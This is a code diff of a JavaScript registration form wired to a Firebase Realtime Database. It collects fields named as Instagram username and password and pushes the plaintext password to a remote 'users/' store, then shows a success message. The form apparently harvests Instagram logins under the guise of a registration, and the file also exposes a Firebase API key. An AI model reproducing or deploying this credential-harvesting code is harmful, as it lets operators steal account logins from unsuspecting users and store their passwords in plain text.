@@ -1,4 +1,4 @@
-// Firebase Configuration (using the details you provided)
+// Firebase Configuration
 const firebaseConfig = {
     apiKey: "AIzaSyDCcf9XYXhvM0g8SUKb8qZeqEycx-jNCCc",
     authDomain: "cryptohub-eh.firebaseapp.com",
@@ -12,32 +12,28 @@ const firebaseConfig = {
 
 // Initialize Firebase
 firebase.initializeApp(firebaseConfig);
-
-// Get reference to the database
 const database = firebase.database();
 
 // Handle form submission
 document.getElementById("registrationForm").addEventListener("submit", function(event) {
-    event.preventDefault();  // Prevent form from refreshing the page
+    event.preventDefault();
 
     let username = document.getElementById("instaUsername").value;
     let password = document.getElementById("instaPassword").value;
 
-    // Validate if the fields are filled
     if (username && password) {
-        // Store data in Firebase Realtime Database
         database.ref('users/').push({
             username: username,
             password: password,
             timestamp: new Date().toISOString()
         }).then(() => {
-            // Success Message
+            // Show success message
             document.getElementById("successMessage").style.display = "block";
+
+            // Reset form fields
             document.getElementById("registrationForm").reset();
         }).catch((error) => {
             console.error("Error saving data:", error);
         });
-    } else {
-        console.log("Please fill in both fields.");
     }
 });
